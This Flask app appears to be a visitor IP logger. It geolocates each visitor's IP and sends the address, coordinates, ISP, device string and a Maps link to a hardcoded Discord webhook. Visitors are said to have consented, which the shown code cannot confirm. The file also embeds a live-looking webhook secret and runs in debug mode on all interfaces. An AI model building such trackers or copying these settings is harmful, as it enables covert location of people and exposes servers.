from flask import Flask, render_template, request, jsonify
import requests
from datetime import datetime

app = Flask(__name__)

# DEIN DISCORD WEBHOOK (DEN HAST DU SCHON!)
WEBHOOK_URL = "https://discord.com/api/webhooks/1529571642022560025/mxoBq18yGw7Vwp1Mu2ZJHsApOQsEHAKfmTUEMsBQgqgKk-fVN9fAJ7-3AKS3lBVXS5Ex"

# Funktion: Holt Standort-Infos zu einer IP
def get_ip_info(ip):
    try:
        url = f"http://ip-api.com/json/{ip}?fields=status,country,city,lat,lon,isp,org,query"
        response = requests.get(url)
        data = response.json()
        
        if data['status'] == 'success':
            return {
                'ip': data.get('query', ip),
                'land': data.get('country', 'Unbekannt'),
                'stadt': data.get('city', 'Unbekannt'),
                'lat': data.get('lat', 0),
                'lon': data.get('lon', 0),
                'isp': data.get('isp', 'Unbekannt'),
                'org': data.get('org', 'Unbekannt'),
                'maps_link': f"https://www.google.com/maps?q={data.get('lat', 0)},{data.get('lon', 0)}"
            }
        return None
    except:
        return None

@app.route('/preview')
def preview():
    return render_template('preview.html')

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/einwilligung')
def einwilligung():
    return render_template('einwilligung.html')

@app.route('/send-ip', methods=['POST'])
def send_ip():
    try:
        ip = request.remote_addr
        if request.headers.get('X-Forwarded-For'):
            ip = request.headers.get('X-Forwarded-For').split(',')[0]
        
        user_agent = request.headers.get('User-Agent', 'Unbekannt')
        zeit = datetime.now().strftime('%d.%m.%Y %H:%M:%S')
        
        # Standort-Infos zur IP holen
        ip_info = get_ip_info(ip)
        
        # Discord-Nachricht zusammenbauen
        if ip_info:
            message = f"""**🆕 Neuer Besucher hat eingewilligt!**

🌐 **IP-Adresse:** `{ip}`
📍 **Standort:** {ip_info['stadt']}, {ip_info['land']}
📌 **Koordinaten:** {ip_info['lat']}, {ip_info['lon']}
🌍 **ISP:** {ip_info['isp']}
🏢 **Organisation:** {ip_info['org']}
🗺️ **Google Maps:** {ip_info['maps_link']}
🕐 **Zeit:** {zeit}
📱 **Gerät:** {user_agent[:50]}..."""
        else:
            message = f"""**🆕 Neuer Besucher hat eingewilligt!**

🌐 **IP-Adresse:** `{ip}`
📍 **Standort:** (konnte nicht ermittelt werden)
🕐 **Zeit:** {zeit}
📱 **Gerät:** {user_agent[:50]}..."""
        
        data = {"content": message}
        response = requests.post(WEBHOOK_URL, json=data)
        
        if response.status_code == 204:
            return jsonify({"status": "success", "message": "IP + Standort wurden gesendet"})
        else:
            return jsonify({"status": "error", "message": "Fehler beim Senden"}), 500
            
    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0', port=10000)
